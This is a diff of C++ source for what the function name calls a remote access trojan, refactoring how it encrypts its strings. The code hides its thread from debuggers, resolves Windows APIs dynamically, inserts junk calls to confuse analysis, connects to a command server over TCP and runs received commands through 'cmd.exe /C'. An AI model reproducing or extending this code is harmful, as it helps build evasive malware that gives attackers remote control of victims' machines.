@@ -26,28 +26,25 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	// with the unique key: use an inline function (or macro possibly?) that gets the key generated, the string literal, reencrypts the string and returns the decrypted string
 	// basically when using the macro or the inline function - we always reencrypt. then we perform the steps (e.g reencrypting afterwards or wiping the strings value) as we wish.
 
+
+	// ok listen so its like this:
+	// define all strings with compile_time_encrypt()
+	// create wrappers that where needed, you just call it like this:  TCPClient* conn = new TCPClient(arrayToString(str_ip_encrypt), 54000);
+	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
 	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(string_encrypt("GetCurrentThread").c_str());
 	resolve_dynamically<NtSetInformationThread_t>(string_encrypt("NtSetInformationThread").c_str(), NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	suspicious_junk_3();
 
-	auto arr = compile_time_encrypt("127.0.0.1");
-	auto key = generate_runtime_key();
-	runtime_reencryption(arr.data(), arr.size(), key);
-	std::string ip = xor_transform(arr.data(), arr.size(), key);
-
 	TCPClient* conn = new TCPClient(string_encrypt("127.0.0.1"), 54000);
 
 	conn->start_connection();
 
-	auto cmdStringArr = compile_time_encrypt("cmd.exe /C ");
-	key = generate_runtime_key();
-	runtime_reencryption(cmdStringArr.data(), cmdStringArr.size(), key);
-
 	while (true)
 	{
+		
 		// recv command from server
-		std::string commandLine = xor_transform(cmdStringArr.data(), cmdStringArr.size(), key);
+		std::string commandLine = string_encrypt("cmd.exe /C ");
 
 		suspicious_junk_1();
 
